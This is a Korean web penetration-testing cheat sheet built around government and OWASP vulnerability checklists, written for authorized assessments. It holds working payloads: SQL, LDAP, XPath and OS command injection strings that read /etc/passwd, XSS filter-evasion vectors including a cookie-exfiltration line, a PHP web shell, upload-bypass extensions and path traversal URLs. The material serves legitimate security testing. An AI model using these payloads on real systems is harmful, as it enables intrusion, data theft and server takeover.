××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××
# 개요 #
1.	점검 항목 소개
2.	점검 진행 방법, 순서
3.	진단 툴 소개
4.	취약점 진단 참고
4-1.	(행안부 28종)
4-2.	(KISA 21종)
4-3.	(owasp top 10)
4-4.	(금감원)
××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××
시작하기 앞서..
웹페이지 진단 항목에 도움이 되고자 작성한 주머니 입니다. 초급적인 내용이 주로 담겨있으며, 열람자가 커스텀해서 사용하시면 좋을것 같습니다.
수정해서 언제든지 배포해주셔도 좋지만(버전만  수정일로 바꿔주세용), 오픈소스에는 올리지 않아주셨으면 합니다.(그럴만한 수준인지도 모르겠지만)
- VER.240911
- UPDATE SY
××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××

<< 1. 점검 항목 소개 >>

◇ 행안부 "웹 취약점 28종"
- 행안부에서 발췌한 웹 페이지 진단 항목
- 24.09.11 일자 기준으로 진단항목 수정된다는 말말말이 있음. (추후 주머니 내용 확인 후 참고해주세요.)

◇ KISA "전자정부 표준 웹 취약점 21종"
- KISA에서 발췌한 웹 페이지 진단 항목 21종
- 행안부 28종과 흡사한 진단 항목이 많으며, 행안부 28종을 기준으로 진단해도 KISA 21종 항목에 접목 가능

◇ 금융감독원 "전자금융기반시설 취약점 분석 평가항목"
- 은행권, 웹 페이지에 결제 시스템이 있는 환경의 웹 페이지에서 점검 의뢰 대상이 되는 항목
- 항목이 많아 작성일 당시 48종(50종 있을 수 있음)을 대상으로 함
- 좀 더 포괄적인 진단 기술이 필요한 항목으로 진단가능한 시간에 맞춰 적절한 준비가 필요함

◇ OWASP TOP 10
- OWASP에서 지정한 웹 취약점을 10개로 추려서 매년 갱신을 함
- 24년 기준으로 항목 순위, 진단 항목이 일부 바뀔거라는 말말말이 있음
- 미국에서 발췌하여 영어로 된 항목명이 특징이지만, 행안부 28, KISA 21 항목에서 일부 겹치는 부분이 존재함

◇ 국정원 8대 취약점
- 국정원에서 지정한 8대 취약점 항목명
- 정말 드물게 점검 항목으로 채택될 수 있지만 자주 등장하지는 않고, 특수성을 띄는 프로젝트일 가능성이 높음

××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××

<< 2. 점검 진행 방법, 순서 >>
◇ 상주 점검
- 고객사에 상주하면서 점검을 진행하는 유형입니다.
- 점검 진행 전 파악할 내용
1. 점검 진행전에 대상 홈페이지 URL 확보
2. 접근권한PC 미리 예외요청(내부에서도 일부 접속이 가능한 IP 대역을 지정하는 경우가 있습니다.)
3. 로그인 기능이 있는 홈페이지의(관리자, 테스트 계정) 미리 발급 및 신청
4. 내부망, 폐쇠망(종종있습니다) 진단에 필요한 툴 미리 반입 신청
5. 자료를 전달, 받을 수 있는 방법 미리 상의해서 준비 (USB, 메일 등)
6. 자동화 툴 사용가능 여부, 실제 운영중인 서버에 부하가능 여부 등 사전에 파악하기
7. 애자일 방식으로 진행해달라고 하는 경우가 종종있음, 미리 체크해서 진단일정에 맞추기
8. -- 추가해주세요 --

◇ 비상주 점검
- 고객사 원격접속 요청하여 사무실에서 작업하는 유형입니다.
- 점검 진행 전 파악할 내용
1. 점검 진행전 IP예외처리 요청
2. 계정 사전에 요청(관리자, 사용자 계정 따로 요청하고 가능하다면 둘다 받아서 각각의 환경에서 점검 진행)
3. 프로젝트를 담당하는 고객사 직원 메일, 연락처 받아놓고
4. 자동화 기능 사용가능한지 여부 확인
5. -- 추가해주세요 --

××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××

<< 3. 진단 툴 소개 >>
1. Burpsuite(pro)	#프록시 진단 툴
2. OWASP Zap		#자동화 취약점 진단 툴 (타율이 좋지않으므로, 발견된 취약점을 기재전에 충분히 확인 후 증적으로 남길것)
3. NMAP 			#포트스캐닝을 통해 웹 사이트의 오픈된 포트, 정보를 제공하는 분석도구(무분별한 사용 시 IP벤 사유가 될 수 있음)
4. WireShark 		#네트워크 통신 과정에서 이동되는 패킷을 분석할 수 있는 툴로 네트워크 관련 정보나, 평문 전송, 암호화 방식에 대해 알 수 있음
5. OpenSSL			#웹 사이트의 암호화 통신 설정을 스캐닝 해주는 분석 도구
6. base64 decode	#base 64, 다른 고급 옵션을 통해 인코딩, 디코딩을 할 수 있는 웹사이트
7. SQLMAP			#KailLinux에서 제공하는 툴로 sql injection 관련하여 자동으로 분석해주는 도구

××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××

<< 4-1. 취약점 진단 참고 #행안부 28종 >>

1. 버퍼 오버플로우 (24년도 행안부 개선내용에서 삭제될 예정)

		- 페이지 네비게이션에서 주로 발생(주로 숫자값)
		1) 입력값 체크
		2) 사용자 입력값 이외 프록시에 나온 값이나 히든 값에 대한 체크하기
		
		[공격가능한 기법]
		- 버퍼에 값을 기록하는 부분
			1-1) C, C++ 등 직접 메모리를 조작할 수 있는 언어로 작성된 경우
			1-2) 취약한 함수 : strcat(), strcpy(), gets(), scanf(), sscanf(), vscanf(), vsscanf(), sprintf(), vsprintf(), gethostbyname()
		- 문자열 : 허용된 범위 이상
		- 숫자 : 허용 범위 이외 숫자값(페이지 네이게이션 같은 곳)
		- null 값 입력(문자열 마지막에 포함)
		- 입력 타입과 벗어난 값 입력 

2. 포맷스트링 (24년도 행안부 개선내용에서 삭제될 예정)

		- prinf 등 출력되는 값에서 확인 가능
		- 검색같이 검색한 내용을 그대로 화면에 뿌려주는 부분
		- 변환하고 결합하여 웹 화면에 출력해주는 부분
		- 전자정부는 스프링 프레임워크 기반으로 프레임워크 내에서만 발생하므로 취약하지 않은 편
		- 달력, 비밀번호 검증 등
		- 숫자형, 날짜형, 문자형 변환 시도
		
3. ldap 인젝션 (24년도 행안부 개선내용에서 통합될 예정)

		- 웹에서 3가지 종류의 데이터 시스템(DB, LDAP, AD)을 쓰고 있음
		- 오류 메시지를 통해서 사용하는 것을 확인해야됨
		- 점검 대상
			1) 로그인 환경
			2) 조직도 같이 계층트리 구조
		- cn, dn 내용 : 정보가 들어가 있는 내용
		- ldap 서비스가 쓰이지 않고 있음, 쓸만한 곳에 썼음 아니면 아예 빼야됨
		- 해당사항이 없더라도 양호의 내용을 삽입하고, 혹시모를 에러내용이 출력되는지 확인
		
		[공격가능한 기법]
		*
		*)(&
		*))%00
		)(cn=))\x00
		*()|%26'
		*()|&'
		*(|(mail=*))
		*(|(objectclass=*))
		*)(uid=*))(|(uid=*
		*/*
		*|
		/
		//
		//*
		@*
		|
		admin*
		admin*)((|userpassword=*)
		admin*)((|userPassword=*)
		x' or name()='username' or 'x'='y
		
4. 운영체제 명령어 삽입 (24년도 행안부 개선내용에서 삭제될 예정)

		- 웹에서 명령어 입력을 통해서 시스템 명령어를 실행 시킬 수 있는 부분에서 실행
		- 주로 관리자 페이지에서 확인됨(스케줄러, 배치 프로그램)
		- 왠만한 검색 부분들에 대해서는 삽입이 되지 않음
		- 그룹웨어, 솔루션 관리 툴 등
		- pdf, 엑셀 다운로드 하는 부분에서 가능한 부분이 있을 수 있음
		- 서버의 용량 체크, os 버전, 서버 확인, 메일 관리 등 서버의 명령어를 날림
		- iis7.0 이하는 asp뒤에 ; 넣고 명령어 실행 가능한거 존재
			1) 일반적인 사용자 페이지에는 해당되는 내용이 없음
			2) 주로 관리자 페이지, 업무 시스템(그룹웨어 등)에서 확인됨 예) 스케줄러, 배치 프로그램
			3) 웹에서 명령어 입력을 통해서 시스템 명령어를 실행 시킬 수 있는 부분에서 실행
			4) pdf, 엑셀 다운로드 하는 부분에서 가능한 부분이 있을 수 있음
			5) 서버의 용량 체크, os 버전, 서버 확인, 메일 관리 등 서버의 명령어를 날림
			6) iis7.0 이하는 asp뒤에 ; 넣고 명령어 실행 가능한거 존재
			7) 덜 필터링될 만한 명령어들 입력 시도

		# 추가작성 
		- 운영체제 명령어 삽입 (거의 안나옴)

		1 &cat%20/etc/passwd&
		2 ;cat%20/etc/passwd;
		3 %22&cat%20/etc/passwd&%22
		4 %22;cat%20/etc/passwd;%22
		5 '&cat%20/etc/passwd&'
		6 ';cat%20/etc/passwd;'
		7 &sleep%205s&
		8 ;sleep%205s;
		9 &sleep%20%7B0%7Ds&
		10 ;sleep%20%7B0%7Ds;
		11 %22&type%20%25SYSTEMROOT%25%5Cwin.ini&%22
		12 &type%20%25SYSTEMROOT%25%5Cwin.ini
		13 %7Ctype%20%25SYSTEMROOT%25%5Cwin.ini
		14 '&type%20%25SYSTEMROOT%25%5Cwin.ini&'
		15 '%7Ctype%20%25SYSTEMROOT%25%5Cwin.ini
		16 %7Ctimeout%20/T%205
		17 &timeout%20/T%20%7B0%7D&
		18 ;get-help
		19 ';get-help
		20 ;start-sleep%20-s%205
		21 %22;start-sleep%20-s%205

5. sql 인젝션

		[공격가능한 기법]
		- 점검 툴 : 테스트 방법에 대한 한 부분으로 삽입
		- 페이지 네이게이션(게시판 글 번호 하는 부분)
		- 검색 부분
		- 1/100 하는 부분 같은 곳 (페이지넘버)
		- 글 수정, 삭제하는 부분의 페이지 번호나 숫자값 등 삭제하면서 변수값 뒤에 ; 삽입해보기
		- SQLMAP을 이용할 때 유효한 값을 이용해서 진행
		- 프로그램들이 변화하면서 DB에 조회가 일어나는 부분
		
		# SQL 인젝션 기법 
		
		' or '1'='1' (#,--)
		' or 1=1 limit 1 -- 
		' or 1=1 limit 1#

		oracle, mssql
		' and '1'='1% 참구문
		' and '1'='2% 거짓구문

		mysql
		' and '1'='1 참구문
		' and '1'='2 거짓구문

		파라미터 값에 넣는 진단 패턴
		%22
		;
		)
		%22 AND %221%22=%221%22 --
		UNION ALL select NULL --
		%22 UNION ALL select NULL --
		UNION select '1', '2', '3', '4'--

6. ssi 인젝션 (24년도 행안부 개선내용에서 삭제될 예정)

		- apache 에서 사용하는 기능중에 하나 (과거에 아파치 설치하는 기본적으로 ssi가 활성화되어 있음)
		
		- ssi취약점이 발생되는 아파치 버전 리스트 필요
		
		[공격가능한 기법]
		- html input 태그에 ; 마무리하고 입력값 삽입
		- 다른 웹서버에서도 한번 확인해보기
		- 점검 입력값 케이스 삽입해두기
		- ssi 기능이 있는 곳에서 가능한 것 -> 톰캣은 안됨
		
		# ssi SQL 인젝션 기법 

		입력 가능한 파라미터 값에
		<!--#echo var=”DOCUMENT_ROOT” -->, <!-- #exec cmd=”ls -al” -->
		삽입하여 전송 후 반환되는 페이지에 사이트의 홈 디렉터리, 디렉터리의 파일 리스트가 표시되는지 확인

7. xpath 인젝션 (24년도 행안부 개선내용에서 삭제될 예정)
		
		- xml 구조 방식으로 통신하는 곳 이외에도 해당될 수 있음
		- soap 외 웹서비스
		- 로그인 부분에 점검 진행
		- 외부 유입 변수로 인해서 리스폰스 값에 xml형태로 변화되는 곳
		- ajax 에 대한 xml형태일때도 가능
		- 유효한 값이 서비스가 양호
		- 툴 점검 이미지도 삽입 필요
		
		[공격가능한 기법]
		- 'and'a'='a / 'and'a'='b
		- ' or count(parent::*[position()=1])>0 or 'a'='b
		- ' and count(../count::*) = 6 or 'a'='b

8. 디렉터리 인덱싱 (24년도 행안부 개선내용에서 변경될 예정)

		- 아파치 예전 버전에는 디렉터리 인덱싱 가능한 부분들이 존재함
		
		[공격가능한 기법]
		- admin/bbs/ (URL이나 경로값 대입이 가능한 부분에 대해서 ../을 이용한 디렉터리 경로 설정 후 값 요청)
		- URL 경로 중 확인하고자 하는 디렉터리까지만 주소창에 입력하여 인덱싱 여부 확인
		- 디렉터리 끝에 %3f.jsp 문자열을 붙여 디렉터리 인덱싱이 되는지 확인

9. 정보누출 (24년도 행안부 개선내용에서 통합될 예정)

		- 중요정보 누출 : 시스템, 서버 부분
			수작업 체크도 필요함(알려진 부분)
			php : ~~.PHP
			jsp : ~~/WEB-INF/web.xml
			asp : ~~/
		- 개인정보 누출 : 주민번호, 결제번호, 이메일, 전화번호 다룰때 웹 페이지 상에 노출되는지 확인
		- 디폴트 페이지에 노출되는 서버나 DB, 개발자 전용 소스코드 노출 등 확인
		- 웹 메소드를 사용하여 프록시 넘길 때 에러페이지 설정되지 않아 디폴트 페이지 노출되는 경우도 있음		
		- 정상적이지 않은 경로로 침투하여 계정에 대한 중요 정보가 노출되는 페이지나 값을 노출하는 경우
		- 파일 업, 다운로드 시 오류를 발생시키거나 파라미터값을 변조하여 접속한 계정의 권한에 맞지않은 정보를 받아오는 경우
		- 이외에 파라미터나 입력값에 대해 의도치않은 정보를 노출하는 경우
		
		# 추가 작성 
		
		//정보 노출 취약점 예시
		-403,404등 에러페이지에 서버정보 노출 출력
		-id가 틀렸을때, 패스워드 틀렸을때 응답이 다름
		-html 주석에 민감한 정보가 있을경우
		-마스킹 처리를 안해서 모니터상에서 비밀번호나 주민등록번호 등이 노출 또는 프록시로 잡았을 때 평문으로 나오는 경우
		-인코딩된 중요정보는 디코딩 가능한지 확인

		메소드 값
		C CREATE    write new create
		R READ      read view content search
		U UPDATE    update modify edit
		D DELETE    del delete remove

		nmap -sT -sV -A -v x.x.x.x : 불필요한 openport, server Version 정보노출 찾기
		nmap -sT [Targer IP] : 일반적인 TCP 포트 스캐닝으로 3handshaking을 통해 로그가 기록
		nmap -sS [Targer IP] : 로그에 기록되지 않음.

10. 악성콘텐츠 (24년도 행안부 개선내용에서 통합될 예정)

	★	- .js .bat .ext 등 실행 파일 삽입
		- aj셀카 경우 js 파일
		- 이지시큐에서 확인하는 \url 확인하는 내용과 인클루드 하는 부분 삽입하기
	★	- js 인젝션
	★	- 취약한 js 실행 부분 -> 서버에서 실행되므로
			존재하는 위험한 js로 js 삽입
			게시판 삽입
			js 링크 삽입되면 취약 (실제로 돌아가는지 확인정도는 해보기)
		- 취약한 서버 공개용 인증서 dat

	★	- HXD 툴을 이용하여 이미지 파일 확장자를 우회가능함 -> 맨 앞에 확장자별로 고유값이 있는데 그 뒤에 악성코드 주입
			보통은 cmd 창을 불러오는 명령어를 사용하지만, 고객사측에서 민감하게 반응할 수 있으므로
			jsp : <% "출력성공 "%> 
			php : <?php echo "취약"; ?>
				등으로 업로드 성공 시 텍스트를 출력하는 형식으로 코드를 주입하는게 좋음.

11. xss (24년도 행안부 개선내용에서 통합될 예정)

		[공격가능한 기법]
		# XSS 문구 예시 (환경에 따라 다양한 기법을 서치, 사용해보기)

		"><script>alert(0)</script>
		<script>alert(0)</script>
		<img src=x onerror=alert(0)>

		%3Cscript%3Ealert%280%29%3C%2Fscript%3E
		&lt;script&gt;alert(0);&lt;/script&gt;


		- 링크나 이미지 경로에 대한 변수처리가 되는 곳이 있습니다. 
		( 조직도의 개별 사진 이미지 불러오기 등 )
		<a href="javascript:alert(0)">Link</a>
		<IMG SRC=javascript:alert(0)>


		- 단순 이미지 태그를 활용한 XSS 공격이 유효한지 확인해보기
		( 웹프로그램에 보안적용을 한답시고 "<script>" 태그에 대해서만 필터 체크하는 경우도 있음 )
		<IMG SRC=javascript:alert('XSS')>

		<IMG SRC=JaVaScRiPt:alert(&quot;XSS&quot;)>

		- UTF-8 Unicode encoding
		<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41>

		- Long UTF-8 Unicode encoding without semicolons
		<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>

		- Hex encoding without semicolons
		<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>

		- Embedded tab to break up XSS.
		<IMG SRC="jav&#x09;ascript:alert('XSS');">

		- Embedded carriage return to break up XSS
		<IMG SRC="jav&#x0D;ascript:alert('XSS');">

		- VBscript in an image
		<IMG SRC='vbscript:msgbox("XSS")'>

		- Iframe
		<IFRAME SRC=javascript:alert('XSS')></IFRAME>

		- Tables
		<TABLE BACKGROUND="javascript:alert('XSS')">



		- 파일 업로드 ( 조건 : 태그를 쓸 수 있는 XSS 취약점이 존재, 2.사용자가 업로드한 파일이 같은 영역내에 업로드 )
			https://vulnerabledoma.in/bypass/text?q=%3Cscript%20src=/bypass/usercontent/xss.js%3E%3C/script%3E
				<script src=/bypass/usercontent/xss.js></script>

			==> 그외 참고	: https://blog.rubiya.kr/index.php/2019/03/28/browsers-xss-filter-bypass-cheat-sheet/
						: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
						
		
		# 추가작성
		
		<SCRIPT>, <OBJECT>, <APPLET>, <EMBED>, <FORM>, <IFRAME>
		"><script>alert(1);</script>
		--><script>alert(1);</script>
		<ruby onmouseover="alert('XSS')">XSS</ruby>
		<script>alert(document.cookie);</script>
		<script>alert(document.JSESSIONID);</script>
		<script>window. location.href=’https://google.com’;</script>
		<img src=”#” onerror=”window. location.href=’https://google.com’;”>
		<img src=”#” onerror=alert(1)>
		<img src=x onerror=alert(1)>
		%3cscript%3ealert(1)%3b%3c%2fscript%3e
		"><iframe src="javascript:alert("XSS")></iframe>
		<img src=javascript:alert("XSS")>
		<body background="javascript:alert('XSS')">
		<body onload=alert("XSS")>
		#<script>alert(XSS)</script>
		http://test.co.kr/page.html#default=<script>alert(document.cookie)</script>
		javascript:alert ( 1);
		</h2><script>alert ( 1);</script><h2>
		<pre><script>alert (1);</script></pre>

		웹 프록시 툴에서 ‘Change Body encoding’을 클릭하고, Content-Type을 ‘multipart/form-data’로 변경한 후 스크립트 구문 입력 시 필터링을 우회하여 실행 가능함

		<script>window.location='쿠키를 저장할 URL/?'+document.cookie;<s/cript>

		참고 url	 공격문구 : https://github.com/devwerks/XSS-Cheatsheet/blob/master/vectors.json
				 JSON 문구 : https://blog.naver.com/PostView.nhn?blogId=security_duck&logNo=221902386040 
				 회피 문구 : https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
						
</script><script>alert("xss")</script>


		 

12. 약한 문자열 강도 (24년도 행안부 개선내용에서 변경될 예정)
	
		- 일정 길이 이상의 값을 사용해야함
		
		- 점검 대상
			1) 패스워드
			2) 인증값 - 고유의 인증값
			3) 평문 암호화 - 암호화 키 부분
			
		[공격가능한 기법]
		취약한 계정: admin, administrator, manager, guest, test, scott, tomcat, root, user, operator,anonymous 등
		취약한 패스워드: Abcd, aaaa, 1234, 1111, test, password, public, blank 패스워드, ID와 동일한 패스워드 등

	
		- 로그인 페이지 점검 : 3가지 유형으로 9자리 이상이어야 함(대/소문자, 특수기호, 숫자 각 1개이상 포함)
		
		- 패스워드 변경 페이지 점검 : 위 내용과 동일하게 적절한 길이값 검증

13. 불충분한 인증 (24년도 행안부 개선내용에서 변경될 예정)

		- 접속한 계정의 권한에 맞지않은 접속, 인증이 가능한 부분을 확인됨
	
		- 점검 대상
			1) 비밀번호(변경창) 등 추가 인증 여부
			2) Response 검증
			
		[공격가능한 기법]
		중요 정보 페이지 접근 전에 본인인증에 대한 재인증 여부 확인
		인증 후 페이지에 아이디만을 인증값으로 하여 변수로 관리 되고 있는지 확인

		- 비밀번호 검증 우회 가능여부 확인
	
		- 권장 설정 값 
		다음 각 목의 문자 종류 중 2종류 이상을 조합하여 최소 10자리 이상 또는 3종류 이상을 조합하여 최소 8자리 이상의 길이로 구성
		(1) 영문 대문자(26개)
		(2) 영문 소문자(26개)
		(3) 숫자(10개)
		(4) 특수문자(32개)
		//연속적인 숫자나 생일, 전화번호 등 추측하기 쉬운 개인정보 및 아이디와 비슷한 비밀번호는 사용하지 않는 것을 권고
		//비밀번호에 유효기간을 설정하여 반기별 1회 이상 변경
		//최근 사용되었던 패스워드 재사용 금지
	
14. 취약한 패스워드 복구 (24년도 행안부 개선내용에서 변경될 예정)
	
		- 취약한 패스워드 복구 메커니즘(패스워드 찾기 등)에 대해 공격자가 불법적으로 다른 사용자의 패스워드를 획득, 변경, 복구할 수 있는 취약점
	
		- 점검 대상
			1) 비밀번호 재발급 시 별도의 추가인증없이 바로 요청이 가능한 부분
			2) 비밀번호 재발행 기능에서 사용자의 연락처, 주소, 메일 주소, 일정 패턴을 패스워드로 이용하는 환경
			3) 비밀번호 변경 시 별도의 인증이 없거나 인증창, 인증과정에서 부적절한 방법으로 인증을 우회하거나 뚫을 수 있는 부분들
			4) 비밀번호 찾기 페이지

		[공격가능한 기법]		
		패스워드 수정페이지의 URL호출시 타 사용자의 값 조작 시도
		개인정보 수정 또는 패스워드 찾기 페이지의 파라메터 값 조작 또는 리턴값 호출 타 사용자로 변경 시도
	
	
		# 추가작성
		
		재설정(또는 패스워드 찾기)되는 패스워드 몇 개를 획득하여 사용자의 연락처, 주소, 
		메일 주소, 일정 패턴을 패스워드로 이용하고 있는지 확인하고 재설정된 패스워드를 
		인증된 사용자 메일이나 SMS로 전송하는지 확인

		사용자 패스워드를 발급해주거나 확인해줄 때 웹 사이트 화면에 바로 출력해주는 것이 아니라
		인증된 사용자 메일이나 SMS로 전송해주어야 함

		패스워드 재발급 검증 실패에 대한 임계값을 설정하여 일정 횟수 이상 실패한 경우
		다른 방식으로 패스워드 찾기 기능을 제공하여야 한다. 

		사용자가 임시패스워드를 발급받은 즉시 새로운 패스워드로 재설정하도록 구현하여야 함

		사용자의 개인정보(연락처, 주소, 메일 주소 등)로 패스워드를 생성하지 말아야 하며,
		난수를 이용한 불규칙적이고 최소 길이(6자 이상 권고) 이상의 패턴이 없는 패스워드를 발급하여야 함
	
15. CSRF (24년도 행안부 개선내용에서 삭제될 예정)

		- 점검 대상
		
			1) 게시판 글쓰기 등 사용자 입력 가능 폼(등록, 변경 등의 데이터 수정 페이지)
			<a href="jungmide.zip">안녕하세요 관리자님</a>
			이런 식으로 게시판 제목(또는 내용) 입력 란에 코드를 삽입한다.
			사용자가 무엇인지 알기 위해서 저장을 누르면 공격을 당하게 되는 것이다.
			글을 누르면, 아래 사진처럼 공격자가 미리 만들어놓은 페이지인 “hack.html“로 이동하게 유도.

			<iframe> 등의 태그를 이용하여 게시판에 글쓰기 내용에 다른 URL을 넣을 경우, 도메인만 넣는 것이 아니라,
			“http://IP_ADDR/test/sessionhijacking_test.js” 등 도메인 뒤에 디렉토리 및
			파일명 추가.(AJ셀카 점검시에 사용했던 js도 샘플 있으니 참고)

			2) 툴 점검 확인
			burp suite > Request 캡쳐 > 우클릭 Engagement tools > Generate CSRF PoC > 테스트
			http://coashanee5.blogspot.com/2018/06/engagement-tools-in-burp-suite.html


16. 세션 예측 (24년도 행안부 개선내용에서 통합될 예정)

		- 단순히 숫자가 증가하는 방법 등의 취약한 특정 세션의 식별자(ID)를 예측하여 세션을 가로챌 수 있는 취약점

		- 세션 하이재킹
		각기 다른 IP 주소와 다른 사용자명, 시간적 차이로 세션 ID를 발급받음
		XSS 등 세션값을 탈취하여 실제로 로그인 시도하여 권한 탈취 가능한지 확인
		
		[공격가능한 기법]
		발급받은 세션 ID에 일정한 패턴(또는 고정)이 있는지 조사
		일정한 패턴이 확인되고, 패턴의 의해 사용 가능한 세션 ID의 예측이 가능한지 확인

17. 불충분한 인가 (24년도 행안부 개선내용에서 변경될 예정)

		- 민감한 데이터 또는 기능에 대한 접근권한 제한을 두지 않은 취약점

		- 공지사항 등의 게시글의 파라메터 조작을 통하여 다른 글을 조회할수 있거나, 사용자의 문의글에 대한 관리자의 답글을 본인 글이 아닌 타인의 글의 조회가 가능할 경우

		- 핸드폰 번호 등 중요정보 마스킹 처리 미흡 여부 체크

18. 불충분한 세션 만료 (24년도 행안부 개선내용에서 삭제될 예정)

		- 세션의 만료 기간을 정하지 않거나, 만료기한을 너무 길게 설정하여 공격자가 만료되지 않은 세션을 활용할 수 있게 되는 취약점

		- 인증 후 정상적으로 세션이 발행된 페이지의 리퀘스트를 취득하여 일정 시간(30분 이상 또는 업무 시스템의 특성에 따라 세션 타임 설정 체크)
		
		- 지난 후에 재전송 시 정상 처리가 되는지 확인

		- 권장 설정값 : 
		>> 금융 - 30분 / 공공 - 1시간, 그룹웨어 등 - 2시간

19. 세션 고정 (24년도 행안부 개선내용에서 삭제될 예정)

		- 사용자 로그인 시 항상 일정하게 고정된 세션 ID 값을 사용하는 취약점

		[공격가능한 기법]
		로그인 후 세션 ID 값과 로그인 전 세션 ID 값이 동일한지 확인 (동일하면 취약)
		로그인 세션 ID가 고정 사용되거나 새로운 세션 ID가 발행되지만 예측 가능한 패턴으로 발행될 경우
		로그인 시 세션 ID가 발행되는지 확인하고 로그아웃 후 다시 로그인할 때 예측 불가능한 새로운 세션 ID가 발급되는지 확인

20. 자동화 공격 (24년도 행안부 개선내용에서 변경될 예정)

		- 웹애플리케이션에 정해진 프로세스에 자동화된 공격을 수행함으로써 자동으로 수많은 프로세스가 진행되는 취약점

		- 로그인 기능에 패스워드 입력 횟수 제한이 없는 경우 공격
		가장 많이 사용하는 패스워드 목록으로 계정당 4번 또는 5번씩 대입
		
		- sms 발송에도 자동화 방지 로직이나 기능이 존재하는지 확인
		
		fun story) 1만개의 유저ID 중 1%만 성공해도 100개의 계정을 탈취할 수 있게 됨

		- 툴 점검 확인
		자동화 공격 도구를 이용한 무자별 대입 공격 시도(계정 정보 획득)
			burp suite 인트루더(Intruder) 사용 > 마/오 > Send to Intruder
			set Number > 반복 숫자 입력
			payload type : simple list

21. 프로세스 검증누락 (24년도 행안부 개선내용에서 변경될 예정)

		- 공격자가 응용의 계획된 플로우 통제를 우회하는 것을 허가하는 취약점

		- 업무프로세스를 확인하여 권한의 종류 및 범위 파악
		
		- 페이지의 모든 기능을 수집하여 프로세스 상에 통제된 페이지에 접근이 가능한지 확인
		
		- URL 강제 입력으로 비인가 페이지 접근 여부 확인

22. 파일 업로드 (24년도 행안부 개선내용에서 삭제될 예정)

		- 점검 대상
			1) 확장자 체크
				- 업로드 위치	ex. 파일이 올라가는 실제 서버 경로
				- 파일 확장자 체크	ex. jsp, php등
				- 파일 타입 체크		ex. content-type : jsp, php
			2) 메소드 파일
				- .bat .exe .php .jsp 등 확장자 우회 업로드
		- 취약점 사례
			1) 클라이언트 단(자바스크립트) 확장자 필터링 검증
			2) mime 타입 검증 미흡
			3) 웹서버 관리자페이지를 통한 업로드 (db서버 관리자 포함) -> TOMCAT 관리자 페이지 등
			4) 포트스캔을 통한 ftp 서버 등 취약한 프로토콜 서비스 확인 후 업로드
			5) http 메소드 이용 -> 쓰기 권한이 있는 폴더에 put 이용하여 업로드
		- 업로드 경로 확인 방법
			1) 리스폰스 전문 확인(업로드 성공 후)
			2) 정상 파일 업로드 후 경로 확인
			3) 파일 다운로드 시
			4) 정보수집
			  - 에러 페이지 및 문구를 통해
			  - html 주석 처리 부분
			  - robots.txt 경로
			5) 서버 담당자에게 직접 확인(가능하면..)


		# 추가작성
		
		(간단하게 만들어본 메소드 파일) 
		
		1. malicious.php 라는 이름으로 php코드가 내포된 파일을 서버에 업로드
		<?php
		if(isset($_GET['cmd'])) {
		system($_GET['cmd']);
		}
		?>
		
		//서버에 업로드 이후 다운로드 경로가 노출되는지 확인 후 해당 경로로 이동하여 파일실행 (업로드 후 아무런 증상이 없거나, 입력한 코드가 그대로 노출되면 취약 x)

		
		1-1. http://example.com/uploads/malicious.php?cmd=ls <- url을 통해 서버에서 임의의 명령어 실행
		
		# 추가작성2
		
		(웹쉘 확장자 우회 시도)

		asp언어 : asp cer cdx asa cds
		
		php : php php3 php4 php5
             html htm phtml inc
		jsp : jsp war jsf

		.php::$data
		.php%00.jpg
		.php;.jpg

		ph%7
		js%70
		%2ejsp

		.php.kr

		- 웹 사이트에 있는 디렉터리 정보를 이용하여 첨부한 Server Side Script 파일의  위치를 조사한 후 브라우저 주소창에 해당 경로를 입력하여 실행 가능한지 확인

		★ php서버이면 php, java면 jsp 파일이 올라가면 취약
		★ php서버에 jsp파일이 올라가는 것은 취약한 것이라고 판단하기 애매함.


23. 파일 다운로드 (24년도 행안부 개선내용에서 통합될 예정)

		- 다운로드 함수 인자를 조작하여 서버에 존재하는 파일이 다운로드가 되는지 여부 점검
		../../../../../../../../../../../../etc/passwd
		../../../../../../../../../../../../winnt/win.ini
		../../../../../../../../../../../../boot.ini

		- 윈도우 공격 (파일 다운로드 취약점)
		http://10.10.34.100:81/chapter1/down.asp?filename=../../../../../../../../../../WINNT/win.ini

		- 리눅스 공격
		http://10.10.34.100:81/chapter1/down.asp?filename=../../../../../../../../../../etc/passwd%00.htm

		http://10.10.34.100:81/chapter1/down.asp?filename=../../../../../../../../../../etc/hosts


		<다운로드 스크립트를 사용하지 않는 경우의 예>
		http://IP_ADDR/test/download/공지사항1.hwp
		
		<다운로드 스크립트를 사용하는 경우의 예>
		http://IP_ADDR/test/filedown.down?file=공지사항3.hwp&path=download

24. 관리자 페이지 노출

		- 단순한 관리자 페이지 이름(admin, manager 등)이나 설정, 프로그램 설계상의 오류로 인해 관리자 메뉴에 직접 접근할 수 있는 취약점

